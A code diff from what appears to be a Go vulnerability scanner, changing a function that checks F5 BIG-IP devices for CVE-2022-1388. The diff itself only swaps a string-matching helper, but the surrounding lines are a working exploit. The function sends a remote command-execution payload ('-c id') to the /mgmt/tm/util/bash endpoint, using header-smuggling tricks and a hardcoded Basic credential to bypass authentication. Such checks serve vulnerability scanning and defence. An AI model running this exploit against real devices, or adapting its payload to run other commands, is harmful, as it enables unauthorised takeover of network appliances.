@@ -3,7 +3,6 @@ package f5
 import (
 	"fmt"
 	"github.com/hktalent/scan4all/pkg"
-	"strings"
 )
 
 func CVE_2022_1388(u string) bool {
@@ -16,13 +15,13 @@ func CVE_2022_1388(u string) bool {
 	header1["Referer"] = "localhost"
 	data := "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
 	if req, err := pkg.HttpRequset(u+"/mgmt/tm/util/bash", "POST", data, false, header1); err == nil {
-		if req.StatusCode == 200 && strings.Contains(req.Body, "commandResult") {
+		if req.StatusCode == 200 && pkg.StrContains(req.Body, "commandResult") {
 			pkg.GoPocLog(fmt.Sprintf("Found F5 BIG-IP CVE_2022_1388|--\"%s\"\n", u))
 			return true
 		} else {
 			header1["Authorization"] = "Basic ZjVodWJibGVsY2RhZG1pbjo="
 			if req, err := pkg.HttpRequset(u+"/mgmt/tm/util/bash", "POST", data, false, header1); err == nil {
-				if req.StatusCode == 200 && strings.Contains(req.Body, "commandResult") {
+				if req.StatusCode == 200 && pkg.StrContains(req.Body, "commandResult") {
 					pkg.GoPocLog(fmt.Sprintf("Found F5 BIG-IP CVE_2022_1388|--\"%s\"\n", u))
 					return true
 				}
@@ -32,7 +31,7 @@ func CVE_2022_1388(u string) bool {
 				header2["Connection"] = "close, X-Forwarded-Host"
 				header2["Content-Type"] = "application/json"
 				if req, err := pkg.HttpRequset(u+"/mgmt/tm/util/bash", "POST", data, false, header2); err == nil {
-					if req.StatusCode == 200 && strings.Contains(req.Body, "commandResult") {
+					if req.StatusCode == 200 && pkg.StrContains(req.Body, "commandResult") {
 						pkg.GoPocLog(fmt.Sprintf("Found F5 BIG-IP CVE_2022_1388|--\"%s\"\n", u))
 						return true
 					}
